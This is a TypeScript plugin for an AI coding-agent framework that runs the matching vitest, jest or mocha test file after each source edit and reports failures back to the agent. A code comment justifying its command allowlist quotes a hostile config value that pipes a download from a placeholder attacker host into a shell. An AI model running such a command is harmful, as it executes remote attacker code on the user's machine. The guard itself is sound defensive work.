/**
 * test-runner-gate plugin — PostToolUse hook that runs the relevant
 * test file after every `write` or `edit` to a source file.
 *
 * Tools registered:
 * - test_gate_status : Show config + per-session counters.
 *
 * Hooks registered:
 * - PostToolUse with matcher `write|edit`. After the tool completes,
 *   maps the changed source file to its test file (using configurable
 *   patterns), runs `vitest run <test-file>` and injects the result
 *   as `additionalContext`.
 *
 * Config (`config.extensions['test-runner-gate']`):
 *
 * ```jsonc
 * {
 *   "enabled": true,
 *   "command": "npx vitest run",       // base test command
 *   "timeoutMs": 30000,                // test process timeout
 *   "testFilePatterns": [              // how to derive test path from source
 *     "src/{path}.test.ts",            // co-located: src/foo.ts → src/foo.test.ts
 *     "tests/{name}.test.ts",          // mirror dir: src/foo.ts → tests/foo.test.ts
 *     "tests/{name}-exec.test.ts"      // exec variant
 *   ],
 *   "injectOnPass": false              // inject context when tests pass too?
 * }
 * ```
 *
 * @public
 */
import type { Plugin } from '@wrongstack/core';
import { execFileSync, execSync } from 'node:child_process';
import { existsSync } from 'node:fs';
import { basename, dirname, isAbsolute, join, relative, resolve } from 'node:path';

const API_VERSION = '^0.1.10';

// ---------------------------------------------------------------------------
// Module-scope state (H1 audit pattern)
// ---------------------------------------------------------------------------

const state = {
  invocationCount: 0,
  /** Times a test file was found and tests ran. */
  runCount: 0,
  /** Times tests passed. */
  passCount: 0,
  /** Times tests failed. */
  failCount: 0,
  /** Times no test file was found for the source file. */
  noTestCount: 0,
  /** Times the test runner itself failed (timeout, crash). */
  errorCount: 0,
  /** Hook handle for teardown. */
  hookUnregister: null as null | (() => void),
  /** Last test result — surfaced by health() + status tool. */
  lastResult: null as null | {
    sourcePath: string;
    testPath: string;
    passed: boolean;
    testCount: number;
    duration: string;
    when: string;
  },
};

// ---------------------------------------------------------------------------
// Config
// ---------------------------------------------------------------------------

type Runner = 'vitest' | 'jest' | 'mocha' | 'auto';

interface TestGateConfig {
  enabled: boolean;
  runner: Runner;
  command: string;
  timeoutMs: number;
  testFilePatterns: string[];
  injectOnPass: boolean;
}

const DEFAULTS: TestGateConfig = {
  enabled: true,
  runner: 'auto',
  command: '',
  timeoutMs: 30_000,
  testFilePatterns: ['src/{name}.test.ts', 'tests/{name}.test.ts', 'tests/{name}-exec.test.ts'],
  injectOnPass: false,
};

function readConfig(raw: unknown): TestGateConfig {
  if (!raw || typeof raw !== 'object') return { ...DEFAULTS };
  const r = raw as Record<string, unknown>;
  const runner: Runner =
    r['runner'] === 'vitest' || r['runner'] === 'jest' || r['runner'] === 'mocha'
      ? r['runner']
      : 'auto';
  return {
    enabled: r['enabled'] !== false,
    runner,
    command: typeof r['command'] === 'string' ? r['command'] : DEFAULTS.command,
    timeoutMs:
      typeof r['timeoutMs'] === 'number' && r['timeoutMs'] > 0
        ? r['timeoutMs']
        : DEFAULTS.timeoutMs,
    testFilePatterns:
      Array.isArray(r['testFilePatterns']) && (r['testFilePatterns'] as unknown[]).length > 0
        ? (r['testFilePatterns'] as unknown[]).filter((x): x is string => typeof x === 'string')
        : DEFAULTS.testFilePatterns,
    injectOnPass: r['injectOnPass'] === true,
  };
}

// ---------------------------------------------------------------------------
// Sandbox: reject paths outside the project root, and lock down the
// `command` config option (config-supplied first token = arbitrary
// binary) to an allowlist of legitimate test runners. test-runner-gate
// runs on every write/edit; an attacker who can write to the plugin
// config can already pivot to test-runner-gate to run any process.
// ---------------------------------------------------------------------------
function withinProject(p: string): boolean {
  if (typeof p !== 'string' || p.length === 0 || p.length > 4096) return false;
  const root = process.cwd();
  const resolved = isAbsolute(p) ? resolve(p) : resolve(root, p);
  const rel = relative(root, resolved);
  if (rel === '' || rel === '.') return true;
  if (rel.startsWith('..')) return false;
  if (isAbsolute(rel)) return false;
  return true;
}

// Allowlist for custom test commands. The first token of `command` must
// resolve to one of these binaries. Without this, a config-supplied
// `command: "curl http://evil.com | sh"` (which split() doesn't help
// against because of pipes handled outside spawn) becomes a directed
// process start. We limit to the same runner families that ship with
// the plugin and the bundled npx + pnpm test wrappers.
const ALLOWED_COMMAND_TOKENS = new Set<string>([
  'npx',
  'pnpm',
  'pnpm',
  'npm',
  'yarn',
  'vitest',
  'jest',
  'mocha',
  // Useful for `command: "node ./scripts/run-tests.js"` style configs.
  'node',
  // Direct binary paths under the project's node_modules — resolved
  // by basename in resolveAllowedCommand().
]);

// ---------------------------------------------------------------------------
// Test file resolution
// ---------------------------------------------------------------------------

/**
 * Given a source file path, derive candidate test file paths using the
 * configured patterns. `{name}` = basename without extension,
 * `{path}` = relative path without extension, `{dir}` = dirname.
 *
 * Example: source = "packages/plugins/src/cost-tracker/index.ts"
 *   {name} = "index", {path} = "packages/plugins/src/cost-tracker/index",
 *   {dir} = "packages/plugins/src/cost-tracker"
 *
 * Patterns:
 *   "tests/{name}.test.ts"           → "tests/index.test.ts"
 *   "src/{path}.test.ts"             → "packages/plugins/src/cost-tracker/index.test.ts"
 *   "{dir}/tests/{name}.test.ts"     → ".../cost-tracker/tests/index.test.ts"
 */
function resolveTestFiles(sourcePath: string, patterns: string[]): string[] {
  const name = basename(sourcePath).replace(/\.[^.]+$/, '');
  const pathNoExt = sourcePath.replace(/\.[^.]+$/, '');
  const dir = dirname(sourcePath);

  const candidates: string[] = [];
  for (const pattern of patterns) {
    const candidate = pattern
      .replace(/\{name\}/g, name)
      .replace(/\{path\}/g, pathNoExt)
      .replace(/\{dir\}/g, dir);
    // If the pattern starts with a relative prefix (not absolute),
    // resolve relative to the source file's directory so co-located
    // patterns like "tests/{name}.test.ts" work from the package root.
    if (!candidate.startsWith('/') && !candidate.includes('{')) {
      // For patterns that don't contain {dir}, resolve relative to
      // the project root (cwd). For patterns with {dir}, they're
      // already absolute relative to the source.
      if (pattern.includes('{dir}')) {
        candidates.push(candidate);
      } else {
        // Try both: as-is (project root) and relative to source dir.
        candidates.push(candidate);
        candidates.push(join(dir, candidate));
      }
    }
  }
  return candidates;
}

/**
 * Find the first test file that exists on disk.
 */
function findTestFile(sourcePath: string, patterns: string[]): string | null {
  const candidates = resolveTestFiles(sourcePath, patterns);
  for (const candidate of candidates) {
    if (existsSync(candidate)) return candidate;
  }
  return null;
}

// ---------------------------------------------------------------------------
// Runner detection
// ---------------------------------------------------------------------------

interface RunnerConfig {
  /** The resolved runner name. */
  name: 'vitest' | 'jest' | 'mocha';
  /** Full command prefix (without test file). */
  command: string;
  /** JSON output flag(s) appended after the test file. */
  jsonFlags: string;
}

/**
 * Detect which test runner is available. "auto" tries vitest, then
 * jest, then mocha. Returns the resolved runner + command prefix.
 * Uses `npx <runner> --version` to check availability.
 */
function detectRunner(requested: Runner): RunnerConfig | null {
  const candidates: RunnerConfig[] = [
    { name: 'vitest', command: 'npx vitest run', jsonFlags: '--reporter=json' },
    { name: 'jest', command: 'npx jest', jsonFlags: '--json' },
    { name: 'mocha', command: 'npx mocha', jsonFlags: '--reporter json' },
  ];

  // If a specific runner is requested, try only that one.
  if (requested !== 'auto') {
    const match = candidates.find((c) => c.name === requested);
    if (!match) return null;
    try {
      execSync(`npx ${match.name} --version`, {
        encoding: 'utf-8',
        timeout: 5_000,
        cwd: process.cwd(),
        stdio: ['pipe', 'pipe', 'pipe'],
      });
      return match;
    } catch {
      return null;
    }
  }

  // Auto: try each in order.
  for (const candidate of candidates) {
    try {
      execSync(`npx ${candidate.name} --version`, {
        encoding: 'utf-8',
        timeout: 5_000,
        cwd: process.cwd(),
        stdio: ['pipe', 'pipe', 'pipe'],
      });
      return candidate;
    } catch {
      // not available
    }
  }
  return null;
}

// ---------------------------------------------------------------------------
// Test runner
// ---------------------------------------------------------------------------

interface TestRunResult {
  passed: boolean;
  testCount: number;
  failCount: number;
  duration: string;
  /** First few failure messages (for context injection). */
  failures: string[];
}

/**
 * Resolve the first token of `customCommand` against an allowlist of
 * legitimate test runners. Returns `[binary, restArgs]` if allowed,
 * `null` otherwise. This prevents a config-supplied `command` from
 * pivoting the runner hook into arbitrary code execution.
 */
function resolveAllowedCommand(customCommand: string): { cmd: string; args: string[] } | null {
  const tokens = customCommand.split(/\s+/).filter(Boolean);
  if (tokens.length === 0) return null;
  const head = tokens[0]!;
  // Bare binary name on the allowlist → pass through (PATH resolution).
  if (ALLOWED_COMMAND_TOKENS.has(head)) {
    return { cmd: head, args: tokens.slice(1) };
  }
  // Absolute path under the project → must resolve inside and the
  // basename must be in the allowlist.
  if (isAbsolute(head)) {
    if (!withinProject(head)) return null;
    const base = basename(head);
    if (ALLOWED_COMMAND_TOKENS.has(base)) {
      return { cmd: head, args: tokens.slice(1) };
    }
  }
  return null;
}

/**
 * Run the test command on a specific test file and parse the output.
 * Returns null if the runner itself failed (timeout, crash, not found,
 * or the custom command failed the allowlist).
 */
function runTests(
  testFile: string,
  runner: RunnerConfig,
  customCommand: string,
  timeoutMs: number,
): TestRunResult | null {
  // Sandbox: refuse to run tests for paths outside the project root.
  if (!withinProject(testFile)) return null;

  // Use custom command if provided, otherwise use the runner's default.
  // execFileSync argv-form — no shell interpolation. testFile goes in as
  // its own argv element so quotes/spaces in names cannot escape.
  let cmd: string;
  let cmdArgs: string[];
  let trailingFlag: string;
  if (customCommand) {
    const resolved = resolveAllowedCommand(customCommand);
    if (!resolved) return null;
    cmd = resolved.cmd;
    cmdArgs = [...resolved.args, testFile];
    trailingFlag = runner.jsonFlags;
  } else {
    // runner.command is hard-coded by the plugin (no user input) and
    // looks like "npx vitest run" — split into argv tokens.
    const tokens = runner.command.split(/\s+/).filter(Boolean);
    cmd = tokens[0]!;
    cmdArgs = [...tokens.slice(1), testFile];
    trailingFlag = runner.jsonFlags;
  }
  // trailingFlag is a single space-delimited string from the runner
  // table (e.g. "--reporter=json"). execFileSync wants its own argv
  // element — split spaces too.
  const trailing = trailingFlag.split(/\s+/).filter(Boolean);
  const fullArgs = [...cmdArgs, ...trailing];
  let stdout = '';
  try {
    stdout = execFileSync(cmd, fullArgs, {
      encoding: 'utf-8',
      timeout: timeoutMs,
      cwd: process.cwd(),
      stdio: ['pipe', 'pipe', 'pipe'],
      shell: false,
    });
  } catch (err: unknown) {
    const e = err as { stdout?: string; killed?: boolean };
    if (e.killed) return null; // timeout
    // vitest exits non-zero when tests fail — stdout has the JSON.
    if (e.stdout) stdout = e.stdout;
    else return null;
  }

  try {
    const data = JSON.parse(stdout);
    const numTotalTests = data.numTotalTests ?? 0;
    const numFailedTests = data.numFailedTests ?? 0;
    const numPassedTests = data.numPassedTests ?? 0;
    const success = data.success ?? numFailedTests === 0;

    // Extract failure messages (up to 5).
    const failures: string[] = [];
    if (data.testResults) {
      for (const fileResult of data.testResults) {
        for (const assertion of fileResult.assertionResults ?? []) {
          if (assertion.status === 'failed') {
            const fullName = assertion.fullName ?? assertion.title ?? 'unknown';
            const message = (assertion.failureMessages?.[0] ?? '').split('\n')[0]?.slice(0, 200);
            failures.push(`${fullName}: ${message}`);
            if (failures.length >= 5) break;
          }
        }
        if (failures.length >= 5) break;
      }
    }

    return {
      passed: success && numFailedTests === 0,
      testCount: numTotalTests,
      failCount: numFailedTests,
      duration: `${data.startTime ? '—' : ''} ${numPassedTests} passed, ${numFailedTests} failed`,
      failures,
    };
  } catch {
    // JSON parse failed — try to extract a summary from plain text.
    const passedMatch = stdout.match(/(\d+)\s+passed/);
    const failedMatch = stdout.match(/(\d+)\s+failed/);
    const passed = passedMatch ? Number.parseInt(passedMatch[1]!, 10) : 0;
    const failed = failedMatch ? Number.parseInt(failedMatch[1]!, 10) : 0;
    return {
      passed: failed === 0,
      testCount: passed + failed,
      failCount: failed,
      duration: `${passed} passed, ${failed} failed`,
      failures: [],
    };
  }
}

// ---------------------------------------------------------------------------
// Plugin
// ---------------------------------------------------------------------------

const plugin: Plugin = {
  name: 'test-runner-gate',
  version: '0.1.0',
  description:
    'PostToolUse hook that runs the relevant test file after every write or edit to a source file',
  apiVersion: API_VERSION,
  capabilities: { tools: true, hooks: true },
  defaultConfig: { ...DEFAULTS },
  configSchema: {
    type: 'object',
    properties: {
      enabled: {
        type: 'boolean',
        default: true,
        description: 'Master switch.',
      },
      runner: {
        type: 'string',
        enum: ['vitest', 'jest', 'mocha', 'auto'],
        default: 'auto',
        description: 'Which test runner to use. "auto" tries vitest first, then jest, then mocha.',
      },
      command: {
        type: 'string',
        default: '',
        description:
          'Custom command prefix (overrides the runner default). Empty = use runner default.',
      },
      timeoutMs: {
        type: 'number',
        minimum: 5000,
        default: 30000,
        description: 'Test process timeout in milliseconds.',
      },
      testFilePatterns: {
        type: 'array',
        items: { type: 'string' },
        default: ['src/{name}.test.ts', 'tests/{name}.test.ts', 'tests/{name}-exec.test.ts'],
        description:
          'Patterns to derive test file from source. {name}=basename, {path}=path-no-ext, {dir}=dirname.',
      },
      injectOnPass: {
        type: 'boolean',
        default: false,
        description: 'Inject additionalContext when tests pass too (default: only on failure).',
      },
    },
  },

  setup(api) {
    // Idempotent re-init (H1 pattern).
    state.invocationCount = 0;
    state.runCount = 0;
    state.passCount = 0;
    state.failCount = 0;
    state.noTestCount = 0;
    state.errorCount = 0;
    state.hookUnregister = null;
    state.lastResult = null;

    const cfg = readConfig(api.config.extensions?.['test-runner-gate']);

    // Detect runner at setup time.
    const runner = detectRunner(cfg.runner);
    if (!runner) {
      api.log.warn(
        'test-runner-gate: no test runner found (vitest, jest, mocha) — hook will be a no-op',
        {
          requested: cfg.runner,
        },
      );
    } else {
      api.log.info('test-runner-gate: detected runner', { name: runner.name });
    }

    const hook = (input: {
      toolName?: string | undefined;
      toolInput?: unknown;
      toolResult?: { content: string; isError: boolean } | undefined;
    }): { additionalContext?: string | undefined } | void => {
      if (!cfg.enabled || !runner) return;

      // Skip if the write/edit itself errored.
      if (input.toolResult?.isError) return;

      const inp = (input.toolInput ?? {}) as Record<string, unknown>;
      const sourcePath = inp['path'] as string | undefined;
      if (!sourcePath || typeof sourcePath !== 'string') return;

      // Sandbox: refuse to derive a test path for source files outside
      // the project root. Without this guard a prompt-injected write at
      // /etc/passwd or C:\Windows could trigger test runs against
      // attacker-controlled candidates.
      if (!withinProject(sourcePath)) return;

      // Skip if the file being edited IS a test file — running tests
      // on a test file that was just modified is fine, but the LLM
      // likely already knows the result from the tool output.
      if (sourcePath.includes('.test.') || sourcePath.includes('.spec.')) return;

      state.invocationCount += 1;

      // Find the corresponding test file.
      const testFile = findTestFile(sourcePath, cfg.testFilePatterns);
      if (!testFile) {
        state.noTestCount += 1;
        return; // no test file found — silent
      }

      // Run the tests.
      const result = runTests(testFile, runner, cfg.command, cfg.timeoutMs);
      if (!result) {
        state.errorCount += 1;
        return; // runner failed — silent
      }

      state.runCount += 1;
      state.lastResult = {
        sourcePath,
        testPath: testFile,
        passed: result.passed,
        testCount: result.testCount,
        duration: result.duration,
        when: new Date().toISOString(),
      };

      if (result.passed) {
        state.passCount += 1;
        if (!cfg.injectOnPass) return; // silent on pass (default)
        return {
          additionalContext:
            `\n✅ test-runner-gate: ${result.testCount} test(s) passed for ${testFile} ` +
            `(${result.duration}). Source: ${sourcePath}.`,
        };
      }

      // Tests failed — inject failure details.
      state.failCount += 1;
      const failureList =
        result.failures.length > 0 ? '\n' + result.failures.map((f) => `  ❌ ${f}`).join('\n') : '';
      const truncated =
        result.failCount > 5 ? `\n  … and ${result.failCount - 5} more failure(s)` : '';

      api.log.warn(`test-runner-gate: ${result.failCount} test(s) failed for ${testFile}`, {
        source: sourcePath,
      });

      return {
        additionalContext:
          `\n❌ test-runner-gate: ${result.failCount} of ${result.testCount} test(s) FAILED for ${testFile} ` +
          `after editing ${sourcePath}.${failureList}${truncated}\n` +
          `Fix the failing tests or revert the change if it broke something.`,
      };
    };

    state.hookUnregister = api.registerHook('PostToolUse', 'write|edit', hook);

    // --- test_gate_status tool ---
    api.tools.register({
      name: 'test_gate_status',
      description:
        'Reports test-runner-gate state: command, patterns, and per-session pass/fail/error/no-test counters.',
      inputSchema: { type: 'object', properties: {} },
      permission: 'auto',
      category: 'Testing',
      mutating: false,
      async execute() {
        return {
          ok: true,
          enabled: cfg.enabled,
          runner: runner?.name ?? 'none',
          command: cfg.command || runner?.command || '',
          timeoutMs: cfg.timeoutMs,
          testFilePatterns: cfg.testFilePatterns,
          injectOnPass: cfg.injectOnPass,
          counters: {
            invocations: state.invocationCount,
            runs: state.runCount,
            passed: state.passCount,
            failed: state.failCount,
            noTest: state.noTestCount,
            errors: state.errorCount,
          },
          lastResult: state.lastResult,
        };
      },
    });

    api.log.info('test-runner-gate plugin loaded', {
      version: '0.1.0',
      command: cfg.command,
      patterns: cfg.testFilePatterns.length,
    });
  },

  teardown(api) {
    if (state.hookUnregister) {
      try {
        state.hookUnregister();
      } catch {
        // best-effort
      }
      state.hookUnregister = null;
    }
    const final = {
      invocations: state.invocationCount,
      runs: state.runCount,
      passed: state.passCount,
      failed: state.failCount,
      noTest: state.noTestCount,
      errors: state.errorCount,
    };
    state.invocationCount = 0;
    state.runCount = 0;
    state.passCount = 0;
    state.failCount = 0;
    state.noTestCount = 0;
    state.errorCount = 0;
    state.lastResult = null;
    api.log.info('test-runner-gate: teardown complete', { final });
  },

  async health() {
    return {
      ok: true,
      message:
        state.lastResult === null
          ? `test-runner-gate: ${state.invocationCount} invocation(s), ${state.runCount} test run(s)`
          : state.lastResult.passed
            ? `test-runner-gate: last run PASSED (${state.lastResult.testCount} tests) on ${state.lastResult.testPath}`
            : `test-runner-gate: last run FAILED (${state.lastResult.testCount} tests) on ${state.lastResult.testPath} at ${state.lastResult.when}`,
      counters: {
        invocations: state.invocationCount,
        runs: state.runCount,
        passed: state.passCount,
        failed: state.failCount,
        noTest: state.noTestCount,
        errors: state.errorCount,
      },
      lastResult: state.lastResult,
    };
  },
};

export default plugin;
